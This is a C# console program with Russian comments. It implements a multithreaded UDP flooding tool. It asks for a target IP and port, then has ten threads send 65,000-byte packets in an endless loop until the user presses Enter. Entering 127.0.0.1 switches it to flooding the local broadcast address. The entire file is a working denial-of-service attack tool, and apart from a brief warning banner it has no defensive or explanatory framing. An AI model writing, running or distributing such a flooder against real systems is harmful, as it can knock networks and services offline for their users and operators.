using System.Net.Sockets;
using System.Net;
using System.Threading;
using System;

class Program
{
    static bool isFlooding = true;  // Флаг, который будет контролировать продолжение флуда
    static int numberOfThreads = 10;  // Количество потоков, которые будут отправлять пакеты

    static void Main()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("WARNING! THIS UTILITY SENDS UDP BROADCAST PACKETS!");
        Console.WriteLine("MAY CAUSE NETWORK ISSUES!\n");
        Console.ResetColor();

        Console.Write("Enter target IP (127.0.0.1 for local network flood): ");
        string targetIP = Console.ReadLine().Trim();
        Console.Write("Enter target port: ");
        int targetPort = int.Parse(Console.ReadLine().Trim());

        int packetSize = 65000; // 65 КБ (максимум для UDP)

        // Если введён 127.0.0.1, отправляем на всю локальную сеть
        if (targetIP == "127.0.0.1")
        {
            targetIP = GetBroadcastAddress();
        }

        // Запуск флуда в нескольких потоках
        for (int i = 0; i < numberOfThreads; i++)
        {
            int threadNumber = i + 1;
            Thread floodThread = new Thread(() => SendPackets(targetIP, targetPort, packetSize, threadNumber));
            floodThread.Start();
        }

        // Ожидание нажатия клавиши Enter для остановки
        Console.WriteLine("\nPress Enter to stop...");
        Console.ReadLine();  // Ждем нажатия клавиши Enter

        // Остановка флуда
        isFlooding = false;
        Console.WriteLine("Flooding stopped.");
    }

    static void SendPackets(string targetIP, int targetPort, int packetSize, int threadNumber)
    {
        using (UdpClient udpClient = new UdpClient())
        {
            udpClient.EnableBroadcast = true;
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(targetIP), targetPort);
            byte[] data = new byte[packetSize]; // Буфер пакетов

            while (isFlooding) // Бесконечный цикл, пока флаг isFlooding = true
            {
                udpClient.Send(data, data.Length, endPoint);
                if (threadNumber == 1 && Thread.CurrentThread.ManagedThreadId % 100 == 0)  // Для отладки
                {
                    Console.WriteLine($"Thread {threadNumber} is sending packets.");
                }
            }
        }
    }

    static string GetBroadcastAddress()
    {
        string localIP = GetLocalIPAddress();
        if (localIP.StartsWith("192.168.")) return "192.168.1.255";
        if (localIP.StartsWith("10.")) return "10.255.255.255";
        return "255.255.255.255"; // Универсальный широковещательный адрес
    }

    static string GetLocalIPAddress()
    {
        foreach (var ip in Dns.GetHostAddresses(Dns.GetHostName()))
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
            {
                return ip.ToString();
            }
        }
        return string.Empty;
    }
}